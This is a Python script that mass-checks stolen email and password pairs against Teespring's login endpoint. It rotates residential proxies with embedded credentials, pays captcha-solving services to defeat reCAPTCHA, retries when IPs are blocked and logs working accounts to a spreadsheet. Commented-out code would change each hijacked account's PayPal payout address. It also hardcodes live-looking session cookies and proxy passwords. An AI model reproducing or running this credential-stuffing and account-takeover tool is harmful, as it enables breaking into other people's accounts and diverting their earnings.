import random
import sys
import time
import traceback
from configparser import ConfigParser
from multiprocessing.pool import ThreadPool
from threading import Lock

import requests
from bs4 import BeautifulSoup
from openpyxl import load_workbook
from python_anticaptcha import AnticaptchaClient, NoCaptchaTaskProxylessTask

PROXIES = [
    'http://lum-customer-hl_7866d962-zone-zone1-country-us:12ypsatl8zly@zproxy.lum-superproxy.io:22225',
    'http://lum-customer-hl_7866d962-zone-zone1-country-gb:12ypsatl8zly@zproxy.lum-superproxy.io:22225',
    'http://lum-customer-hl_7866d962-zone-zone2-country-us:12pqfcboroxq@zproxy.lum-superproxy.io:22225',
    'http://lum-customer-hl_7866d962-zone-zone2-country-gb:12pqfcboroxq@zproxy.lum-superproxy.io:22225',
    'http://lum-customer-hl_7866d962-zone-zone3-country-us:rthu8x05933e@zproxy.lum-superproxy.io:22225',
    'http://lum-customer-hl_7866d962-zone-zone3-country-gb:rthu8x05933e@zproxy.lum-superproxy.io:22225',
    'http://lum-customer-hl_7866d962-zone-zone4-country-us:m0wdgith1wti@zproxy.lum-superproxy.io:22225',
    'http://lum-customer-hl_7866d962-zone-zone4-country-gb:m0wdgith1wti@zproxy.lum-superproxy.io:22225',
    'http://lum-customer-hl_7866d962-zone-zone5-country-us:9jhehktl5278@zproxy.lum-superproxy.io:22225',
    'http://lum-customer-hl_7866d962-zone-zone5-country-gb:9jhehktl5278@zproxy.lum-superproxy.io:22225',
    'http://lum-customer-hl_7866d962-zone-zone6-country-us:j0au1g290vez@zproxy.lum-superproxy.io:22225',
    'http://lum-customer-hl_7866d962-zone-zone6-country-gb:j0au1g290vez@zproxy.lum-superproxy.io:22225',
    'http://lum-customer-hl_7866d962-zone-static-country-gb:8us5gf64hux8@zproxy.lum-superproxy.io:22225',
    'http://lum-customer-hl_7866d962-zone-static-country-us:8us5gf64hux8@zproxy.lum-superproxy.io:22225',
]

headers = {
    'authority': 'teespring.com',
    'origin': 'https://teespring.com',
    'x-csrf-token': 'r1oD1fbD52k8ycqtwmuACvSNEc/XYlWPc+YOSidUxV8HcoN+z5FbzqtQDXVo+anY+57trsdZJu/3WmrZ1q1REg==',
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'x-requested-with': 'XMLHttpRequest',
    'dnt': '1',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors',
    'referer': 'https://teespring.com/login',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'en-US,en;q=0.9,ja;q=0.8,ny;q=0.7',
    'cookie': '__cfduid=d17d1fe8b1acb49a335f01a358fbcb45f1576727930; __cflb=3137940736; __stripe_mid=aab15c88-3b90-4b0e-8312-a43b3f8d1077; utm_params=%7B%7D; _ga=GA1.2.1779341329.1576727934; _gid=GA1.2.1027173571.1576727934; cto_lwid=95fa3be2-c8b1-462e-a848-a2806cc43fe8; anonymous_id=88270201825a1f516622e3130c934df9; universal_tracking_id=08Gb9GK0p9oaV4WKuhapeA; optimizelyEndUserId=oeu1576727940493r0.0779835270670759; yieldify_stc=1; yieldify_st=1; yieldify_sale_ts=1576727942618; yieldify_visit=1; yieldify_basket=NaN; yieldify_iv=1; _y2=1%3AeyJjIjp7IjExOTE1NiI6LTE0NzM5ODQwMDAsIjExOTE1OSI6LTE0NzM5ODQwMDAsIjExOTMwNSI6LTE0NzM5ODQwMDAsIjEyMzExMCI6LTE0NzM5ODQwMDAsIjEyMzExMSI6LTE0NzM5ODQwMDAsIjEyMzQ3MiI6LTE0NzM5ODQwMDAsIjEyMzcxOCI6LTE0NzM5ODQwMDAsIjEyMzcyMiI6LTE0NzM5ODQwMDAsIjEyMzk5OSI6LTE0NzM5ODQwMDAsIjEyNDAwMCI6LTE0NzM5ODQwMDAsIm8iOi0xNDczOTg0MDAwfX0%3D%3ALTE0NzEzNjMxNjg%3D%3A2; liveagent_oref=https://teespring.com/login; liveagent_sid=3e785ecb-ead7-4b61-8906-925ace4f2bb3; liveagent_vc=2; liveagent_ptid=3e785ecb-ead7-4b61-8906-925ace4f2bb3; sidebarState=expanded; _hjid=6a465b7a-d51c-40ba-b8f0-388411ff70f3; __stripe_sid=9ea7fd04-321b-4647-8b08-d232190f85f9; _y1sp_ses.2636=*; yieldify_location=%257B%2522country%2522%253A%2522Vietnam%2522%252C%2522region%2522%253A%2522Tinh%2520Ha%2520Nam%2522%252C%2522city%2522%253A%2522Thanh%2520Pho%2520Phu%2520Ly%2522%257D; intercom-session-q6yypxtd=TFNpSUl0cXF1TWRqNk5PdGdJSVJYd3V6d0ptNVpaNWFCUXl4elVhaHNZVk1QMngxeFBMTm8vRVptY1VyMkVTKy0tZldQQUpseSt2cUszQ3VFZWdubHVpQT09--32a66afaf6cc341d67b0b1a8bb3b3f9ccacb83a8; user_analytics=%7B%22user_id%22%3Anull%2C%22user_email_hash%22%3A%22%22%2C%22session_id%22%3A%2288270201825a1f516622e3130c934df9%22%2C%22universal_tracking_id%22%3A%2208Gb9GK0p9oaV4WKuhapeA%22%2C%22logged_in%22%3Afalse%2C%22created_campaign%22%3Afalse%2C%22successful_campaign%22%3Afalse%2C%22is_buyer%22%3Afalse%2C%22landing_host%22%3A%22teespring.com%22%2C%22social_network%22%3A%22anonymous%22%2C%22is_mobile%22%3Afalse%2C%22is_bot%22%3Afalse%2C%22browser%22%3A%22Chrome%22%2C%22browser_version%22%3A%2279.0.3945.79%22%2C%22platform%22%3A%22X11%22%2C%22operating_system%22%3A%22Linux+x86_64%22%2C%22ip_address%22%3A%2214.189.191.115%22%2C%22country%22%3A%22Vietnam%22%2C%22region%22%3A%22Tinh+Thanh+Hoa%22%2C%22region_code%22%3A%2221%22%2C%22city%22%3A%22Phu+Ly%22%2C%22preferred_locale%22%3A%22en%22%2C%22version%22%3A%222%22%7D; _gat=1; AWSALB=3RulXW9Wx9mSEDe5ngs0kinkZSvKTspVPPsKy++mpsVzVw4/QOCnspfkTj5JFK/A4ipm4ub5Z+LJ2ReQ9FptoRz44IBwr0bnTkToV931aWC9is1CtUYBKzTBdOr8; _teespring_session_5=OHAyUVI2WHVDUldwOVRRdTk0NHdYZmZEWENmUmI4LzdqK3BZR0VmTENSUFZWTnk5U2ZUaWRzZGlQa2FnMG5JbVlZSWRaWDZhSk9hWXRRZ3lwNFJ6ZzJpcDM1RXNXcVNEOXhVNzMzazNFaXYwdm9qT281OWdqRGYybUdNVlNYSlBFdU5uajM1dzNDQU9wVTdwMTR2dXJtWmRIbWVLQWFDZXpDY1dNeTd2U0czM0NzNHlHd2NsM05JNEJwK0htWVVWU3YyS2N5VHBkelFFeVkralBPU3lDUXZaMUxDaWN4M0ZhcTNpYjlMUlNIU3BKS0tiNFdrRERiSzVFTWE3dGpDZ29WTWs1Ykg1ejVSVlVFYUlhS2tmVFBpaERyM0V3eWY1WnhjMGp3b1ZzR1BlUktPWk4vZytHNVovaExibTJmRHhVN001SmNGTUNnNGYzUVRmNmxzMDREcnMybmZyMFYweUdaZit4T0YzMk5wUDc3L3Q2djE4Rm9iMVJVQ3lteEhYV3pwT2FzTjFuYkFTVTU2U2pjREw2YWtVYlRMNVMxUFlTK0NkTTRYMWNzWT0tLVVLVkNScUlWY0l4VlkrTDExR29TcXc9PQ%3D%3D--70435ecfbbaebc16f13f1425d0ba3c6869011704; _y1sp_id.2636=b84c6607-87b7-446a-aaf0-3be1cd14bbc6.1576727943.2.1576743891.1576728039.7a38098b-c1d9-4d04-bd66-7d67d0756c92; yieldify_ujt=7026; _yi=1%3AeyJsaSI6bnVsbCwic2UiOnsiYyI6MiwibGEiOjE1NzY3NDM5MDI1NzQsInAiOjgsInNjIjoyNDMwfSwidSI6eyJpZCI6IjkwZTIwZGQ1LWY2ZmMtNDQ3Ny05ZmY5LTUyZGJkMTVhNDI3NiIsImZsIjoiMCJ9fQ%3D%3D%3ALTE5NjU3ODQwMA%3D%3D%3A2; amplitude_id_5724b63d7362152436ab11f94f83516eteespring.com=eyJkZXZpY2VJZCI6IjA4R2I5R0swcDlvYVY0V0t1aGFwZUEiLCJ1c2VySWQiOiI0MjAyNTc1Iiwib3B0T3V0IjpmYWxzZSwic2Vzc2lvbklkIjoxNTc2NzQzNTQ1ODg0LCJsYXN0RXZlbnRUaW1lIjoxNTc2NzQzOTAzMzc2LCJldmVudElkIjo0NSwiaWRlbnRpZnlJZCI6MzAsInNlcXVlbmNlTnVtYmVyIjo3NX0=',
}

result_lock = Lock()


def save_result():
    with result_lock:
        wb.save(filename=filename)


def check_acc(row):
    try:
        email = row[0].value
        print(f"[{email}]\tStart check")
        password = row[1].value
        start_time = time.time()
        # if captcha == 'anticaptcha':
        #     code = get_anticaptcha()
        # else:
        #     code = get_2captcha()
        delta_time = time.time() - start_time
        print(f"[{email}]\tCaptcha time: {int(delta_time)}s")

        data = {
            'email': email,
            'password': password,
            'otp': '',
            'g-recaptcha-response': '03AOLTBLQqDwr7gb0klZ_2vRBD_Un6FJIfVcrMyDk4rVFBGOwMDA9L26XRJQPWFW9FGXeyrZeF8UYya98KL2LBO3tkRxYQNvcLqd-d3-zdfv5hre_oOmjxnA2F4ihfPveMsjRAWaKvMXe_vnvbZUuEi1_TPnVyxCH2Eq201T_SA5PSuofrYwZF6qZeHB_Pgo6IsURcIrrpr82BCNFC5SZHOFr4XMdrmNiEC-ZnJoIyQG0hP7Omi5Z_bCQdMPzTp5EMcXcfpuP-fe4gu-Cu6_7wh3mACFn7mdo4x6e8ppRJAMwtpv3ZecCO3Sf8V0oHEftiIo4ndstR1h3FNh32WqKZt0WrupAgT5hSCNM969ZHuECoOtGcNslsnYNhYZ58gYt7n2n2nftvEsOD9ZjlL1CC__A7-fxD7JDJCPx3jxGV3JdwFQ2c4MJOaFqspOr1hFz3ha9Wy03aZbAOneFd_ujdrNynjoeTqL_4i__Z5gaZ-0aa45awLQ6sdK70MVAg9ewTmY1-fjNaEYmG',
            'remember_user': 'on'
        }

        s = requests.Session()
        proxy = random.choice(PROXIES)
        proxies = {
            'http': proxy,
            'https': proxy
        }
        s.proxies = proxies
        ip = s.get('http://lumtest.com/myip.json').json()['ip']
        print(f"[{email}]\tIP: {ip}")
        row[5].value = ip
        s.headers = headers
        response = s.post(TEESPRING_COM_SESSION, data=data)
        row[2].value = response.text
        if 'Retry later' in response.text:
            row[2].value = ''
            row[4].value = 'Blocked IP'
            print(f"[{email}]\tFail: Blocked IP")
            save_result()
            check_acc(row)
            return
        save_result()
        result = response.json()
        if 'message' in result and result['message'] == "Success!":
            row[3].value = "Success"
            save_result()
            print(f"[{email}]\tSuccess")
        elif 'field' in result and result['field'] == 'recaptcha':
            row[4].value = response.text
            row[2].value = ""
            save_result()
            print(f"[{email}]\tRetry captcha")
            check_acc(row)
        else:
            print(f"[{email}]\tFail!")

        print(s.cookies)
        # setting_page = s.get('https://teespring.com/dashboard/settings').text
        # setting_page_bs = BeautifulSoup(setting_page, 'html.parser')
        # paypal_form = setting_page_bs.select('.update_paypal_email__form')[0]
        # action = paypal_form.attrs['action']
        # token = paypal_form.select('input[name="authenticity_token"]')[0].attrs['value']
        # data = {
        #     'utf8': '\u2713',
        #     'authenticity_token': token,
        #     'user[paypal_email]': email,
        #     'user[paypal_email_confirmation]': email,
        #     'commit': 'Set Paypal address'
        # }
        #
        # response = s.post('https://teespring.com' + action, data=data)

    except Exception as e:
        row[4].value = str(e)
        save_result()
        traceback.print_exc()

    else:
        row[4].value = ''
        save_result()


def get_anticaptcha():
    client = AnticaptchaClient(api_key)
    task = NoCaptchaTaskProxylessTask(TEESPRING_COM_SESSION, G_SITEKEY)
    print(f"Money left: {client.getBalance()}")
    job = client.createTask(task)
    job.join()
    code = job.get_solution_response()
    return code


def get_2captcha():
    res = requests.get(
        f'https://2captcha.com/in.php?key={_2captcha_api_key}&method=userrecaptcha&googlekey={G_SITEKEY}&json=1&pageurl={TEESPRING_COM_SESSION}')
    print(res.text)
    try:
        request_id = res.json()['request']
    except:
        print('Error', res.text)
        return ''
    code = 'CAPCHA_NOT_READY'
    count = 1
    while code == 'CAPCHA_NOT_READY':
        time.sleep(2)
        res2 = requests.get(
            f'https://2captcha.com/res.php?key={_2captcha_api_key}&action=get&id={request_id}&json=1')
        code = res2.json()['request']
        count += 1
    return code


TEESPRING_COM_SESSION = 'https://teespring.com/sessions'
G_SITEKEY = '6LdFYQgUAAAAAE6j6MctlWXn6YIsGzb0xIyjIH4A'

config = ConfigParser()
config.read('config.ini')

api_key = config['default']['anticaptcha_api']
_2captcha_api_key = config['default']['2captcha_api']
captcha = config['default']['captcha']
thread = int(config['default']['threads'])
if __name__ == '__main__':

    if len(sys.argv) > 1:
        filename = sys.argv[1]
    else:
        filename = config['default']['check_file']
    print(f'Load {filename}')
    wb = load_workbook(filename=filename)
    sheet = wb._sheets[0]

    acc_list = []
    rows = sheet.rows
    next(rows)
    total_acc = 0
    for row in rows:
        if row[0].value:
            acc_list.append(row)

    print(f"Total: {total_acc} accounts")
    print(f"Remain: {len(acc_list)} accounts")
    print(f"Run with {thread} threads\n\n")
    pool = ThreadPool(thread)
    pool.map(check_acc, acc_list)
    input("Done")
